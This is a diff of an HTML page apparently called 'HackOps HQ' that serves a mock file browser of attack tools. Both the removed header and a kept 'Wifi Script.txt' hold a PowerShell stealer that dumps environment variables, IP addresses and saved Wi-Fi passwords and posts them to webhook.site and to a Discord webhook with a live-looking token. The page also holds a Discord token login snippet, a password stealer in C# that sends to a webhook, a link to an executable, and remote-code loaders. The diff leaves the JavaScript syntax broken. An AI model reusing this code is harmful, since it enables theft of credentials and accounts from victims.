@@ -133,17 +133,7 @@
 
   <!-- Main Content -->
   <div class="content">
-    <h1>$url="https://webhook.site/d06a384b-10ea-4d4d-941d-4861067de848";
-dir env: >> stats.txt;
-Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\\d+\\.\\d+)' >> stats.txt;
-(netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}
-| Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_}
-| %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;
-$Body=@{ content = "$env:computername Stats from Ducky/Pico"};
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $url -Method Post -Body ($Body | ConvertTo-Json);
-curl.exe -F "file1=@stats.txt" $url;
-Remove-Item '.\\stats.txt';
-exit</h1>
+    <h1>Welcome to HackOps HQ</h1>
     <div class="buttons">
       <a href="https://bleh-xi.vercel.app/Charlottes%20App.exe">
         <button>Charlottes App.exe</button>
@@ -237,7 +227,7 @@ exit</h1>
     const fileSystem = {
       name: "root",
       files: [
-        {
+{
   name: "Discord Token Login Code.txt",
   content: `function login(token) {
   setInterval(() => {
@@ -266,7 +256,7 @@ login('PASTE TOKEN HERE');`
           files: [
             {
               name: "Wifi Script.txt",
-              content: `$url="https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5";
+              content: $url="https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5";
 dir env: >> stats.txt;
 Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\\d+\\.\\d+)' >> stats.txt;
 (netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}
@@ -276,7 +266,7 @@ $Body=@{ content = "$env:computername Stats from Ducky/Pico"};
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $url -Method Post -Body ($Body | ConvertTo-Json);
 curl.exe -F "file1=@stats.txt" $url;
 Remove-Item '.\\stats.txt';
-exit`
+exit
             }
           ],
           folders: [
@@ -285,7 +275,7 @@ exit`
               files: [
                 {
                   name: "Passwords.cs",
-                  content: `using System;
+                  content: using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Text;
@@ -539,7 +529,7 @@ namespace Big_Silly
             await SendToWebhookAsync(allPasswords);
         }
     }
-}`
+}
                 }
               ],
               folders: []
@@ -547,12 +537,9 @@ namespace Big_Silly
           ]
         },
         {
-          name: "Roblox Scripts",
+          name: "Tools",
           files: [
-            { name: "RuniX Hub.lua", content: "loadstring(game:HttpGet("https://raw.githubusercontent.com/ShadowByte098/Hub/refs/heads/main/Hub"))()" }
-          ],
-          files: [
-            { name: "Infinite Yield.lua", content: "loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()" }
+            { name: "Tool.lua", content: "-- Lua tool script here" }
           ],
           folders: []
         }
